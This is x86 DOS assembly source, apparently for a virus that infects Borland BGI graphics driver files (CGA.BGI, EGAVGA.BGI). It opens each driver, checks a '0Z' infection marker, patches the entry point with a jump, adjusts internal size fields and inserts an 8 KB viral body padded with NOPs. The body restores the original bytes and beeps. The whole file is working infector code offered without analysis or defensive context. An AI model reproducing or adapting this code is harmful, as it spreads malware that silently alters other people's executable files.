
bgi_codestart   equ     (word ptr 0080h)
bgi_codesize    equ     (word ptr 0084h)
bgi_addvirsize1 equ     (word ptr 006ch)
bgi_addvirsize2 equ     (word ptr 0072h)
bgi_addvirsize3 equ     (word ptr 0084h)
bgi_addvirsize4 equ     (word ptr 008ah)

include         rulez.inc

                org     100h
start:
                lea     dx, file1
                call    infect_bgi
                lea     dx, file2
                call    infect_bgi

                mov     ax, 4c00h
                int     21h

file1           db      'CGA.BGI',0
file2           db      'EGAVGA.BGI',0

infect_bgi:     mov     ax, 3d02h
                int     21h
                xchg    bx, ax

                mov     ah, 3fh
                lea     dx, bgi
                mov     cx, 32768
                int     21h
                mov     bp, ax

                mov     ax, '0Z'
                mov     cx, ax
                xchg    cx, bgi.word ptr 4
                cmp     ax, cx
                je      close

                mov     si, bgi.BGI_CODESTART

                lea     di, bgi[si]

                mov     eax, [di]
                mov     rest_data, eax

                mov     al, 0e9h
                stosb
                mov     ax, bgi.BGI_CODESIZE
                sub     ax, 3
                stosw

                add     si, bgi.BGI_CODESIZE

                add     bgi.bgi_addvirsize1, virsize
                add     bgi.bgi_addvirsize2, virsize
                add     bgi.bgi_addvirsize3, virsize
                add     bgi.bgi_addvirsize4, virsize

                mov     ax, 4200h
                cwd
                xor     cx, cx
                int     21h

                mov     ah, 40h
                lea     dx, bgi
                mov     cx, si
                int     21h

                mov     ah, 40h
                lea     dx, vir
                mov     cx, virsize
                int     21h

                mov     ah, 40h
                lea     dx, bgi
                add     dx, si
                mov     cx, bp
                sub     cx, si
                int     21h

close:          mov     ah, 3eh
                int     21h

                ret

vir:            mov     dword ptr cs:[0], 12345678h
rest_data       equ     dword ptr $-4

                push    ax
                mov     al, 7
                int     29h
                pop     ax

                push    0
                ret
                db      8192-($-VIR) dup (90h)
virsize         equ     $-vir

bgi             db      ?

                end     start
